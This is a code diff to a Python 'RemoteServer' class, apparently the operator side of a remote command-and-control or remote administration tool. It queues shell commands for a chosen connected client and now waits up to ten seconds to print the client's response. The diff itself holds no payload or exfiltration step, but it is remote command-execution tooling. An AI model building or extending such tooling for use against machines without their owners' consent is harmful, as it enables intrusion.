@@ -20,6 +20,8 @@ class RemoteServer:
         self.host = host
         self.port = port
         self.clients = {}
+        self.pending_commands = {}
+        self.responses={}
         self.server_socket = None
         self.running = False
         
@@ -250,13 +252,23 @@ class RemoteServer:
                         cmd = parts[2]
                         
                         if client_id in self.clients:
+                            self.responses[client_id]=None
                             self.pending_commands[client_id] = {
                                 'type': 'cmd',
                                 'data': cmd
                             }
                             print(f"[*] Command sent to {client_id}")
-                            time.sleep(1)
-                            self.handle_client(client_id=client_id,client_socket=self.server_socket) #to see display
+                            #from here it should show the result of cmd execution
+                            start_wait = time.time()
+                            while self.responses.get(client_id) is None and time.time() - start_wait < 10:
+                                time.sleep(0.1)
+                            
+                            # 4. Display the result
+                            if self.responses.get(client_id):
+                                print(self.responses[client_id])
+                                self.responses[client_id] = None # Clear it
+                            else:
+                                print("[!] Timeout: No response received from client.")
                             
                         else:
                             print(f"[!] Client {client_id} not found")
